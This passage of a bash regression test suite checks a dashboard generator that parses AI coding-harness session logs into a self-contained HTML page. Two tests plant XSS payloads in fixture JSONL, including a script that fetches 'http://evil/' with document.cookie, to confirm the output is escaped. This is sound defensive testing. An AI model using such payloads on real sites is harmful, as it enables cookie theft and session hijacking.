  [[ "$(node_get "$DATA" 'm.degraded.every(d=>d.reason.includes(d.source==="claude-code"?".claude":d.source==="codex"?".codex":".gemini"))')" == "true" ]] \
    || log_fail "each degraded reason must name the harness-specific expected location"
  log_pass "TEST-020: no hardcoded home strings; os.homedir+path.join used; degraded names location"
}

# ============================ TEST-024 (Spec-AC-09) ============================
test_024_one_shot_prints_path_exits_0() {
  log_info "Test: one-shot mode prints the output path and exits 0..."
  local h; h="$(mk_home t024)"
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  grep -q "live-status-data.json" "$OUT" || log_fail "stdout must print the data output path"
  grep -q "live-status.html" "$OUT" || log_fail "stdout must print the html output path"
  log_pass "TEST-024: one-shot mode prints both output paths and exits 0"
}

# ============================ TEST-025 (Spec-AC-09) ============================
test_025_watch_mode_rewrites_and_clean_sigint() {
  log_info "Test: watch mode with a 1s interval rewrites outputs >=2x within 4s and exits 0 on SIGINT, no leftover child..."
  local h; h="$(mk_home t025)"
  mkdir -p "$h/out"
  local html="$h/out/live-status.html"
  local data="$h/out/live-status-data.json"

  # Backgrounded DIRECTLY in this shell (not inside a `(...)` subshell) so
  # `wait "$pid"` below sees it as this shell's own job — a subshelled `&`
  # exits with the subshell, leaving `wait` with a PID that is "not a child
  # of this shell" (bash exit 127), which is a test-harness bug, not a
  # generator bug.
  node "$GEN" --home "$h" --output "$html" --cache "$h/cache.json" --spool-dir "$h/spool" --watch --interval 1 > "$h/watch.log" 2>&1 &
  local pid=$!
  sleep 0.3
  local m1; m1="$(stat -f "%m" "$data" 2>/dev/null || stat -c "%Y" "$data" 2>/dev/null || echo 0)"
  sleep 2.2
  local m2; m2="$(stat -f "%m" "$data" 2>/dev/null || stat -c "%Y" "$data" 2>/dev/null || echo 0)"
  sleep 2.2
  local m3; m3="$(stat -f "%m" "$data" 2>/dev/null || stat -c "%Y" "$data" 2>/dev/null || echo 0)"

  kill -INT "$pid" 2>/dev/null || true
  local wait_ec=0
  wait "$pid" 2>/dev/null || wait_ec=$?
  [[ "$wait_ec" == 0 ]] || log_fail "watch process must exit 0 on SIGINT, got $wait_ec: $(cat "$h/watch.log")"

  local children; children="$(pgrep -P "$pid" 2>/dev/null || true)"
  [[ -z "$children" ]] || log_fail "watch process must leave no surviving child process, found: $children"

  # At least two DISTINCT rewrites observed across the three samples.
  local distinct=1
  [[ "$m1" != "$m2" ]] && distinct=$((distinct + 1))
  [[ "$m2" != "$m3" ]] && distinct=$((distinct + 1))
  [[ "$distinct" -ge 2 ]] || log_fail "expected at least 2 rewrites within the sampling window, mtimes: $m1 $m2 $m3"
  log_pass "TEST-025: watch mode rewrote outputs >=2x, clean exit 0 on SIGINT, no leftover child"
}

# ============================ TEST-026 (Spec-AC-10) ============================
test_026_meta_refresh_and_skip_section() {
  log_info "Test: meta refresh interval equals the watch interval; SKIP section names every degraded source..."
  local h; h="$(mk_home t026)"
  run_gen "$h" --interval 45
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  grep -q '<meta http-equiv="refresh" content="45">' "$HTML" || log_fail "meta refresh must equal the configured interval (45)"
  grep -qi "claude-code" "$HTML" || log_fail "SKIP section must name claude-code"
  grep -qi "codex" "$HTML" || log_fail "SKIP section must name codex"
  grep -qi "gemini-cli" "$HTML" || log_fail "SKIP section must name gemini-cli"
  grep -q "ABSENT" "$HTML" || log_fail "SKIP section must carry a reason for each degraded source"
  log_pass "TEST-026: meta refresh == watch interval; SKIP section names every degraded source"
}

# ============================ TEST-027 (Spec-AC-09) ============================
test_027_opener_refusal() {
  log_info "Test: aai-live.sh resolves an opener and refuses with a named error instead of hanging when none exists..."
  local fakebin="$TEST_DIR/t027-emptybin"
  mkdir -p "$fakebin"
  # Only the external commands aai-live.sh itself needs are on PATH (via
  # symlink) — deliberately no open/xdg-open. bash is resolved to its
  # ABSOLUTE path first (PATH is about to be overridden for the child).
  local bash_abs; bash_abs="$(command -v bash)"
  ln -sf "$(command -v node)" "$fakebin/node"
  ln -sf "$(command -v dirname)" "$fakebin/dirname"
  local rc=0
  local out
  out="$(PATH="$fakebin" "$bash_abs" "$LIVE" --data-only --home "$TEST_DIR/t027home" 2>&1)" || rc=$?
  [[ "$rc" != 0 ]] || log_fail "aai-live.sh must refuse (non-zero exit) when no opener is on PATH"
  echo "$out" | grep -qi "opener" || log_fail "refusal must name the missing opener, got: $out"
  log_pass "TEST-027: aai-live.sh refuses with a named error when no opener is found (rc=$rc)"
}

# ============================ TEST-028 (Spec-AC-01) ============================
# Regression pin for the B1 validation blocker: the old `isMain` guard
# compared path.resolve(process.argv[1]) (raw) against
# path.resolve(new URL(import.meta.url).pathname) (percent-encoded), so any
# script path containing a space (or other URL-encoded char) never matched
# and `main()` was never invoked — a silent exit-0 no-op writing nothing.
test_028_spaced_script_path_runs() {
  log_info "Test: the generator writes both outputs when its OWN script path contains a space (B1 isMain regression)..."
  local spaced="$TEST_DIR/space test/gen"
  mkdir -p "$spaced/live-parsers"
  # Resolve to the PHYSICAL path (pwd -P): on macOS $TMPDIR sits under a
  # /var -> /private/var symlink, and process.argv[1] (not symlink-resolved)
  # vs import.meta.url (symlink-resolved by the module loader) would then
  # disagree for a reason that has nothing to do with the space-in-path bug
  # this test targets — that would be an environment artifact, not evidence.
  spaced="$(cd "$spaced" && pwd -P)"
  mkdir -p "$spaced/lib"
  cp "$GEN" "$spaced/generate-live-status.mjs"
  cp "$PROJECT_ROOT/.aai/scripts/live-parsers/"*.mjs "$spaced/live-parsers/"
  cp "$PROJECT_ROOT/.aai/scripts/lib/runtime-file.mjs" "$spaced/lib/runtime-file.mjs"
  local h; h="$(mk_home t028)"
  mkdir -p "$h/out"
  local out="$h/gen-run.log"
  local data="$h/out/live-status-data.json"
  local html="$h/out/live-status.html"
  local ec=0
  node "$spaced/generate-live-status.mjs" --home "$h" --output "$html" --cache "$h/cache.json" \
    --spool-dir "$h/spool" --now "$NOW" > "$out" 2>&1 || ec=$?
  [[ "$ec" == 0 ]] || log_fail "must exit 0 even when its own script path contains a space: $(cat "$out")"
  [[ -f "$data" ]] || log_fail "data JSON missing when invoked from a spaced script path (isMain regression): $data"
  [[ -f "$html" ]] || log_fail "html missing when invoked from a spaced script path (isMain regression): $html"
  log_pass "TEST-028: generator writes both outputs when its own script path contains a space"
}

# ============================ TEST-029 (Spec-AC-02) ============================
# Regression pin for the N2 validation finding: session_cumulative_last
# guarded the overwrite on `r.ts &&`, so when records carry NO top-level
# timestamp the first record won and every later one was rejected —
# inverting "last cumulative wins" to "first cumulative wins". Fix: when a
# reliable ts comparison isn't available, fall back to encounter (file) order
# — the later record in iteration order always wins.
test_029_codex_cumulative_last_no_timestamp_tiebreak() {
  log_info "Test: session_cumulative_last resolves last-cumulative-wins by file order when records carry no ts..."
  # Exercises the exported accumulate() directly (same style as TEST-006):
  # three same-session records with no ts at all, in ascending-usage file
  # order. The old `r.ts &&` guard kept whichever arrived FIRST (100); the
  # fix must keep the LAST one encountered (300), matching "session
  #_cumulative_last" even when no reliable ts exists to compare.
  # NB: the module path is passed via env, NOT as process.argv[1] — GEN's own
  # isMain guard (fixed under B1) fires main() whenever process.argv[1]
  # resolves to GEN's own path, which a plain `node -e '...' "$GEN"` positional
  # arg would do, writing real files into cwd as an import side effect.
  local msg
  msg="$(GEN_MODULE_PATH="$GEN" node -e '
    import(process.env.GEN_MODULE_PATH).then((mod) => {
      const entry = { accumulation: "session_cumulative_last" };
      const records = [
        { sessionId: "cx1", ts: null, usage: 100 },
        { sessionId: "cx1", ts: null, usage: 200 },
        { sessionId: "cx1", ts: null, usage: 300 },
      ];
      const out = mod.accumulate(entry, records);
      console.log(JSON.stringify(out.map((r) => r.usage)));
    });
  ')"
  [[ "$msg" == "[300]" ]] || log_fail "expected the LAST record by file order (usage 300) with no ts, got: $msg"
  log_pass "TEST-029: no-timestamp session_cumulative_last records resolve last-wins deterministically by file order"
}

# ============================ TEST-030 (Spec-AC-10) ============================
# Regression pin for BLOCKING-1 (code review): the session-quotas render
# branch (payload.rate_limits.primary.*, foreign data read verbatim from a
# harness JSONL file) interpolated through na() — not esc() — while every
# sibling branch escapes. A hostile used_percent/resets_at therefore injected
# a live <script> (and an outbound fetch(...)) into a page the spec
# guarantees is self-contained and network-free.
test_030_hostile_quotas_payload_escaped() {
  log_info "Test: a hostile Codex rate_limits payload (script tag + attribute breakout in used_percent/resets_at) renders fully escaped, zero live <script> (BLOCKING-1)..."
  local h; h="$(mk_home t030)"
  mkdir -p "$h/.codex/sessions/2026/08/08"
  cat > "$h/.codex/sessions/2026/08/08/rollout-1-abc.jsonl" <<'JSONL'
{"type":"session_meta","timestamp":"2026-08-08T09:00:00.000Z","payload":{"session_id":"cx1","cwd":"/x/codexproj"}}
{"type":"event_msg","timestamp":"2026-08-08T09:02:00.000Z","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":20,"output_tokens":10,"cached_input_tokens":0}},"rate_limits":{"primary":{"used_percent":"50<script>alert(1)</script>","window_minutes":300,"resets_at":"2026-08-08T14:00:00Z\"><script>fetch('http://evil/'+document.cookie)</script>"}}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  [[ "$(node_get "$DATA" 'm.quotas.source')" == "session:codex" ]] || log_fail "quotas source must be session:codex"
  # Zero LIVE <script tags in the page — this is the actual exploit surface
  # (an executable script that could fetch()). A literal escaped mention of
  # "http://" as inert text content is fine and expected below; it proves the
  # hostile value survived rather than being silently dropped.
  local n; n="$(node -e '
    const fs=require("fs"); const h=fs.readFileSync(process.argv[1],"utf8");
    process.stdout.write(String((h.match(/<script/gi)||[]).length));
  ' "$HTML")"
  [[ "$n" == "0" ]] || log_fail "html must carry zero live <script tags from foreign quota data, found $n"
  grep -q "&lt;script&gt;alert(1)&lt;/script&gt;" "$HTML" || log_fail "html must render the ESCAPED script tag from used_percent, not drop or unescape it"
  grep -q '&quot;&gt;&lt;script&gt;' "$HTML" || log_fail "html must render the ESCAPED attribute-breakout attempt from resets_at, not drop or unescape it"
  log_pass "TEST-030: hostile Codex rate_limits payload renders fully escaped, zero live <script> tags"
}

# ============================ TEST-031 (Spec-AC-09) ============================
# Regression pin for BLOCKING-2 (code review): aai-live.sh's / aai-live.ps1's
# --watch warm-up ran the generator with --data-only (writes ONLY the JSON,
# suppresses the HTML) and then immediately handed the (nonexistent) HTML
# path to the platform opener. Because both outputs are gitignored, this was
# the default first-run experience of the feature's headline command in
# every fresh checkout. Fix: drop --data-only from the warm-up.
test_031_watch_warmup_opens_existing_html() {
  log_info "Test: aai-live.sh --watch warm-up writes the HTML before the opener fires, no MISSING first run (BLOCKING-2)..."
  local scratch="$TEST_DIR/t031repo"
  mkdir -p "$scratch"
  # Resolve to the PHYSICAL path (pwd -P), same reason as TEST-028: on macOS
  # $TMPDIR sits under a /var -> /private/var symlink. aai-live.sh derives
  # REPO_ROOT via `cd "$SCRIPT_DIR/../.." && pwd` (logical, symlink-preserving),
  # while the generator's own isMain guard compares against import.meta.url
  # (symlink-RESOLVED by the ESM loader) — an unresolved scratch path makes
  # them disagree, main() never runs, and the warm-up becomes a silent exit-0
  # no-op that writes nothing, which is not the BLOCKING-2 behavior this test
  # targets.
  scratch="$(cd "$scratch" && pwd -P)"
  mkdir -p "$scratch/.aai/scripts/live-parsers" "$scratch/.aai/scripts/lib"
  cp "$LIVE" "$scratch/.aai/scripts/aai-live.sh"
  cp "$GEN" "$scratch/.aai/scripts/generate-live-status.mjs"
  cp "$PROJECT_ROOT/.aai/scripts/live-parsers/"*.mjs "$scratch/.aai/scripts/live-parsers/"
  cp "$PROJECT_ROOT/.aai/scripts/lib/runtime-file.mjs" "$scratch/.aai/scripts/lib/runtime-file.mjs"
  local fixture_home; fixture_home="$(mk_home t031home)"
  local openerlog="$TEST_DIR/t031-opener.log"
  local openerbin="$TEST_DIR/t031-opener.sh"
  : > "$openerlog"
  cat > "$openerbin" <<SH
#!/usr/bin/env bash
if [[ -f "\$1" ]]; then echo "EXISTS \$1" >> "$openerlog"; else echo "MISSING \$1" >> "$openerlog"; fi
SH
  chmod +x "$openerbin"

  # HOME (not --home: aai-live.sh's warm-up call takes no fixture flags) plus
  # the three harness overrides pointed at the empty fixture keep this fully
  # sandboxed, same posture as every other test in this file.
  HOME="$fixture_home" USERPROFILE="$fixture_home" AAI_LIVE_OPENER="$openerbin" \
    CLAUDE_CONFIG_DIR="$fixture_home/.claude" CODEX_HOME="$fixture_home/.codex" GEMINI_HOME="$fixture_home/.gemini" \
    bash "$scratch/.aai/scripts/aai-live.sh" --watch --interval 1 > "$TEST_DIR/t031-watch.log" 2>&1 &
  local pid=$!
  sleep 1
  kill -INT "$pid" 2>/dev/null || true
  wait "$pid" 2>/dev/null || true

  [[ -s "$openerlog" ]] || log_fail "opener was never invoked: $(cat "$TEST_DIR/t031-watch.log")"
  grep -q "^MISSING" "$openerlog" && log_fail "opener received a nonexistent HTML path on first run (BLOCKING-2 regression): $(cat "$openerlog")"
  grep -q "^EXISTS" "$openerlog" || log_fail "opener never observed the HTML as EXISTS: $(cat "$openerlog")"

  # BLOCKING-I (re-review 105110Z): the fix above (dropping --data-only from
  # the warm-up) introduced a NEW regression — `node "$GEN" "${WARMUP_ARGS[@]}"`
  # expands an EMPTY array under this script's own `set -u`, which bash < 4.4
  # (bash 3.2.57, the ONLY bash on stock macOS and at /bin/bash on this
  # machine) treats as an unbound-variable error, killing the script before
  # it generates, opens, or watches anything. WARMUP_ARGS is empty for
  # exactly one invocation: bare `--watch` with no other flag — the form
  # documented at docs/product/live-status-dashboard.md:35 and the script's
  # own usage line. The case above never catches this because
  # `--watch --interval 1` leaves one surviving element in the array. Run
  # bare `--watch` explicitly under `/bin/bash` (never bare `bash`, which
  # could resolve to a newer non-stock bash on a contributor's PATH and
  # silently satisfy this assertion without exercising the bug).
  local openerlog2="$TEST_DIR/t031-opener-bare.log"
  local openerbin2="$TEST_DIR/t031-opener-bare.sh"
  : > "$openerlog2"
  cat > "$openerbin2" <<SH
#!/usr/bin/env bash
if [[ -f "\$1" ]]; then echo "EXISTS \$1" >> "$openerlog2"; else echo "MISSING \$1" >> "$openerlog2"; fi
SH
  chmod +x "$openerbin2"

  HOME="$fixture_home" USERPROFILE="$fixture_home" AAI_LIVE_OPENER="$openerbin2" \
    CLAUDE_CONFIG_DIR="$fixture_home/.claude" CODEX_HOME="$fixture_home/.codex" GEMINI_HOME="$fixture_home/.gemini" \
    /bin/bash "$scratch/.aai/scripts/aai-live.sh" --watch > "$TEST_DIR/t031-watch-bare.log" 2>&1 &
  local pid2=$!
  sleep 1
  kill -INT "$pid2" 2>/dev/null || true
  wait "$pid2" 2>/dev/null || true

  grep -qi "unbound variable" "$TEST_DIR/t031-watch-bare.log" && log_fail "bare --watch (no other flags) under /bin/bash must not die on an unbound WARMUP_ARGS array (BLOCKING-I): $(cat "$TEST_DIR/t031-watch-bare.log")"
  [[ -s "$openerlog2" ]] || log_fail "bare --watch: opener was never invoked: $(cat "$TEST_DIR/t031-watch-bare.log")"
  grep -q "^MISSING" "$openerlog2" && log_fail "bare --watch: opener received a nonexistent HTML path on first run: $(cat "$openerlog2")"
  grep -q "^EXISTS" "$openerlog2" || log_fail "bare --watch: opener never observed the HTML as EXISTS: $(cat "$openerlog2")"
  log_pass "TEST-031: --watch warm-up writes the HTML before the opener fires; no MISSING first run; bare --watch survives /bin/bash's set -u (BLOCKING-I)"
}

# ============================ TEST-032 (Spec-AC-05) ============================
# Regression pin for BLOCKING-3 (code review): --home overrode only
# HOME/USERPROFILE while leaving the harnesses' own env overrides
# (CLAUDE_CONFIG_DIR, CODEX_HOME, GEMINI_HOME) in place, and each parser
# prefers its own override over HOME — so an exported CLAUDE_CONFIG_DIR
# silently defeated an empty --home fixture and read the real corpus.
test_032_home_flag_overrides_harness_env() {
  log_info "Test: --home strips CLAUDE_CONFIG_DIR/CODEX_HOME/GEMINI_HOME so the fixture is airtight (BLOCKING-3)..."
  local h; h="$(mk_home t032)"
  # A real-ish CLAUDE_CONFIG_DIR that, if honored over --home, would report a
  # PRESENT claude-code harness with a real session — the empty --home
  # fixture must win regardless.
  local realish="$TEST_DIR/t032-realish-claude"
  mkdir -p "$realish/projects/proj"
  cat > "$realish/projects/proj/leak.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"leak","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"r1","message":{"id":"m1","model":"m","usage":{"input_tokens":9,"output_tokens":9,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  mkdir -p "$h/out"
  local out="$h/gen-run.log" data="$h/out/live-status-data.json" html="$h/out/live-status.html"
  local ec=0
  CLAUDE_CONFIG_DIR="$realish" CODEX_HOME="$TEST_DIR/t032-nonexistent-codex" GEMINI_HOME="$TEST_DIR/t032-nonexistent-gemini" \
    node "$GEN" --home "$h" --output "$html" --cache "$h/cache.json" --spool-dir "$h/spool" --now "$NOW" \
    > "$out" 2>&1 || ec=$?
  [[ "$ec" == 0 ]] || log_fail "must exit 0: $(cat "$out")"
  local avail; avail="$(node_get "$data" "(m.harnesses.find(h=>h.id==='claude-code')||{}).available")"
  [[ "$avail" == "false" ]] || log_fail "--home must win over CLAUDE_CONFIG_DIR: claude-code must be ABSENT, got available=$avail"
  local sessions; sessions="$(node_get "$data" "(m.harnesses.find(h=>h.id==='claude-code')||{}).sessions_total")"
  [[ "$sessions" == "0" ]] || log_fail "expected zero sessions parsed from the leaked real-ish corpus, got $sessions"
  local root; root="$(node_get "$data" "(m.harnesses.find(h=>h.id==='claude-code')||{}).root")"
  case "$root" in
    "$realish"*) log_fail "claude-code root still points at the leaked CLAUDE_CONFIG_DIR path: $root" ;;
  esac
  log_pass "TEST-032: --home overrides CLAUDE_CONFIG_DIR/CODEX_HOME/GEMINI_HOME; zero files parsed from the real-ish corpus"
}

# ============================ TEST-033 (Spec-AC-02) ============================
# O1-family honesty fix (code review NB-2, remediated together with the
# BLOCKING findings): a session file that fails to read (permissions,
# mid-scan deletion, rotation) used to vanish with no trace, producing a
# plausible-looking verified zero. It must now be named in notes[].
test_033_unreadable_file_named_in_notes() {
  log_info "Test: an unreadable session file is named in notes[] instead of silently vanishing (O1-family honesty)..."
  local h; h="$(mk_home t033)"
  mkdir -p "$h/.claude/projects/proj"
  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"req1","message":{"id":"msg1","model":"m","usage":{"input_tokens":10,"output_tokens":5,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  chmod 000 "$h/.claude/projects/proj/s1.jsonl"
  # Probe: root (and some CI) bypass mode bits, so the read would still
  # succeed and there would be nothing to assert. Skip in that case.
  if node -e 'require("fs").readFileSync(process.argv[1],"utf8")' "$h/.claude/projects/proj/s1.jsonl" >/dev/null 2>&1; then
    chmod 644 "$h/.claude/projects/proj/s1.jsonl" 2>/dev/null || true
    log_pass "TEST-033: skipped assertion (permission bits not enforced in this environment)"
    return
  fi
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "cold run must exit 0 even with an unreadable session file: $(cat "$OUT")"
  local usage; usage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
  [[ "$usage" == "0" ]] || log_fail "unreadable file must not fabricate usage, expected 0, got $usage"
  local hasNote; hasNote="$(node_get "$DATA" 'm.notes.some(n=>n.includes("claude-code") && n.includes("read failed"))')"
  [[ "$hasNote" == "true" ]] || log_fail "cold run: expected a named notes[] entry for the unreadable file, got: $(node_get "$DATA" 'JSON.stringify(m.notes)')"
  # Warm run (BLOCKING-A, re-review 102429Z): run_gen reuses the SAME --cache
  # path for this $h, so this second run is a cache HIT for s1.jsonl (its
  # mtime/size are unchanged — the file is still chmod 000). A cached FAILED
  # parse used to be stored as a normal {records: []} entry with no memory of
  # the failure, so every subsequent run silently re-absorbed the file into a
  # 0 with no note — one honest tick, then indefinitely many dishonest ones
  # under --watch. The note must survive the cache hit.
  run_gen "$h"
  chmod 644 "$h/.claude/projects/proj/s1.jsonl" 2>/dev/null || true
  [[ "$EC" == 0 ]] || log_fail "warm run (cache hit) must exit 0: $(cat "$OUT")"
  local usage2; usage2="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
  [[ "$usage2" == "0" ]] || log_fail "warm run: unreadable file must not fabricate usage, expected 0, got $usage2"
  local skipped; skipped="$(node_get "$DATA" 'm.scan.files_skipped_unchanged')"
  [[ "$skipped" == "1" ]] || log_fail "warm run: expected the cache to have taken the skip branch (files_skipped_unchanged=1), got $skipped"
  local hasNote2; hasNote2="$(node_get "$DATA" 'm.notes.some(n=>n.includes("claude-code") && n.includes("read failed"))')"
  [[ "$hasNote2" == "true" ]] || log_fail "warm run (cache hit) dropped the note — BLOCKING-A regression: $(node_get "$DATA" 'JSON.stringify(m.notes)')"
  log_pass "TEST-033: unreadable session file named in notes[] on BOTH a cold run and a warm cache-hit run"
}

# ============================ TEST-034 (Spec-AC-02) ============================
# O1-family honesty fix (code review NB-7 / validator O1, remediated together
# with the BLOCKING findings): a record with no reliable timestamp matches
# neither isToday nor within7d and used to contribute a silent, plausible 0.
# It must now be named in notes[].
test_034_ts_less_record_named_not_silent() {
  log_info "Test: a record with no timestamp is named in notes[] instead of silently contributing a fabricated 0 (O1-family honesty)..."
  local h; h="$(mk_home t034)"
  mkdir -p "$h/.claude/projects/proj"
  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","requestId":"req1","message":{"id":"msg1","model":"m","usage":{"input_tokens":10,"output_tokens":5,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
  local usage; usage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
  [[ "$usage" == "0" ]] || log_fail "ts-less record must not silently inflate usage_today, expected 0, got $usage"
  local hasNote; hasNote="$(node_get "$DATA" 'm.notes.some(n=>n.includes("claude-code") && n.includes("no timestamp"))')"
  [[ "$hasNote" == "true" ]] || log_fail "expected a named notes[] entry for the ts-less record, got: $(node_get "$DATA" 'JSON.stringify(m.notes)')"
  log_pass "TEST-034: ts-less record excluded from totals AND named in notes[], never a silent fabricated 0"
}

# ============================ TEST-035 (Spec-AC-03) ============================
# Regression pin for BLOCKING-B (code review 102429Z): loadCache/saveCache used
# to hand-roll their lifecycle (bare try/catch -> {} on read, plain
# writeFileSync on write) instead of lib/runtime-file.mjs's loadOrDegrade /
# atomicWrite. A damaged (e.g. truncated mid-write) cache file was silently
# read as "nothing there" and a plain writeFileSync left a torn-write window.
# After migrating to the shared primitives, a truncated cache must recover
# HONESTLY: a named notes[] entry for the rebuild, and correct totals from the
# cold re-parse it falls back to — never a silently wrong or missing figure.
test_035_truncated_cache_recovers_honestly() {
  log_info "Test: a truncated/corrupt cache file recovers with a named note and correct totals, never silent (BLOCKING-B)..."
  local h; h="$(mk_home t035)"
  mkdir -p "$h/.claude/projects/proj"
  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"req1","message":{"id":"msg1","model":"m","usage":{"input_tokens":10,"output_tokens":5,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "cold run must exit 0: $(cat "$OUT")"
  local usage_cold; usage_cold="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
  [[ "$usage_cold" == "15" ]] || log_fail "expected usage_today 15 on the cold run, got $usage_cold"
  local cache="$h/cache.json"
  [[ -f "$cache" ]] || log_fail "cache file was not written: $cache"
  # Simulate a torn write / partial crash mid-save: truncate to half size, so
  # the file is present but unparseable JSON.
  local size; size="$(wc -c < "$cache" | tr -d ' ')"
  head -c "$((size / 2))" "$cache" > "$cache.trunc" && mv "$cache.trunc" "$cache"
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "run over a truncated cache must still exit 0: $(cat "$OUT")"
  local usage_warm; usage_warm="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
  [[ "$usage_warm" == "15" ]] || log_fail "truncated cache must not corrupt totals, expected 15, got $usage_warm"
  local hasNote; hasNote="$(node_get "$DATA" 'm.notes.some(n=>n.includes("cache") && (n.includes("corrupt") || n.includes("rebuild")))')"
  [[ "$hasNote" == "true" ]] || log_fail "expected a named notes[] entry for the corrupt cache rebuild, got: $(node_get "$DATA" 'JSON.stringify(m.notes)')"
  log_pass "TEST-035: truncated cache recovers with a named note and correct totals, never silent"
}

# ============================ TEST-036 (Spec-AC-10) ============================
# Regression pin for BLOCKING-II (re-review 105110Z): the spend-rows render
# branch (generate-live-status.mjs:507) was the ONLY remaining na() call on
# foreign-derived data in renderHtml — na() does not escape, unlike naEsc().
# The enabling gap sat one layer below: claude-code.mjs's and codex.mjs's
# usageTotal() summed foreign harness fields with `(field || 0) + ...` and no
# Number() coercion, so a truthy non-numeric field (e.g. a string) turned `+`
# into string concatenation, propagating verbatim through usageToday
# accumulation into the rendered cell — a live <script> in a page whose
# entire value proposition is "no network reference, ever" (Spec-AC-10).
# Both layers are fixed together: the parser boundary now nulls out (honest
# N/A / excluded, never a fabricated 0) on a non-coercible field, AND the
# render site now uses naEsc() as defense in depth.
test_036_hostile_token_field_escaped_and_coerced() {
  log_info "Test: a hostile/non-numeric token field renders with zero live <script> tags and a real number, never concatenated garbage (BLOCKING-II)..."
  local h; h="$(mk_home t036)"
  mkdir -p "$h/.claude/projects/proj" "$h/.codex/sessions/2026/08/08"
  # Claude Code: one clean record (input_tokens=7, output_tokens=3 -> 10) plus
  # one hostile record whose input_tokens is a script-tag string. The clean
  # total must survive untouched; the hostile record must be excluded, never
  # silently absorbed as a fabricated 0 nor concatenated into the total.
  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"r1","message":{"id":"m1","model":"m","usage":{"input_tokens":7,"output_tokens":3,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:05:00.000Z","requestId":"r2","message":{"id":"m2","model":"m","usage":{"input_tokens":"<script>fetch('http://evil/'+document.cookie)</script>","output_tokens":0,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
JSONL
  # Codex: partial-shape payload (no total_tokens, so the manual-sum
  # fallback runs) with a hostile cached_input_tokens field — the fallback
  # branch the review found unguarded (only the total_tokens branch had a
  # typeof check).
  cat > "$h/.codex/sessions/2026/08/08/rollout-1-abc.jsonl" <<'JSONL'
{"type":"session_meta","timestamp":"2026-08-08T09:00:00.000Z","payload":{"session_id":"cx1","cwd":"/x/codexproj"}}
{"type":"event_msg","timestamp":"2026-08-08T09:02:00.000Z","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":20,"output_tokens":10,"cached_input_tokens":"<script>fetch('http://evil/'+document.cookie)</script>"}}}}
JSONL
  run_gen "$h"
  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"

  local n; n="$(node -e '
    const fs=require("fs"); const h=fs.readFileSync(process.argv[1],"utf8");
    process.stdout.write(String((h.match(/<script/gi)||[]).length));
  ' "$HTML")"
  [[ "$n" == "0" ]] || log_fail "html must carry zero live <script tags from a hostile token field, found $n"

  local ccUsage; ccUsage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
  [[ "$ccUsage" == "10" ]] || log_fail "claude-code usage_today must be the clean total 10 (hostile record excluded, never concatenated), got: $ccUsage"
  node -e '
    const v = process.argv[1];
    if (!/^-?\d+(\.\d+)?$/.test(v)) { process.stderr.write("not a plain number: " + v + "\n"); process.exit(1); }
  ' "$ccUsage" || log_fail "claude-code usage_today must be a plain number, not concatenated garbage"

  local cxUsage; cxUsage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='codex')||{}).usage_today")"
  node -e '
    const v = process.argv[1];
    if (v !== "null" && !/^-?\d+(\.\d+)?$/.test(v)) { process.stderr.write("not null and not a plain number: " + v + "\n"); process.exit(1); }
  ' "$cxUsage" || log_fail "codex usage_today must be null or a plain number, never concatenated garbage, got: $cxUsage"

  grep -qi "<script" "$HTML" && log_fail "html must carry no <script> tag anywhere on the page"
  log_pass "TEST-036: hostile token field renders zero live <script> tags and a real number (BLOCKING-II)"
}

main() {
  echo "Testing $TEST_NAME (SPEC spec-live-status-dashboard TEST-001..020, 024..036)"
  check_deps
  setup_fixture
  test_001_run_writes_both_outputs
  test_002_absent_home_all_absent
  test_003_no_network_imports
  test_004_claude_code_dedup
  test_005_codex_cumulative_last
  test_006_registry_refuses_malformed_entry
  test_007_incremental_cutoff_unchanged
  test_008_incremental_cutoff_appended
  test_009_gemini_usage_na
  test_010_all_parsers_reachable
  test_011_seam_tap_quotas_render
  test_012_quotas_skip_no_tap
  test_013_codex_session_rate_limits
  test_014_seam_tap_whitelist
  test_015_liveness_hooks_and_heuristic
  test_016_never_coupled_to_ride
  test_017_product_doc_install_uninstall
  test_018_seam_html_matches_data
  test_019_seam_git_and_docs_audit_clean
  test_020_no_hardcoded_home
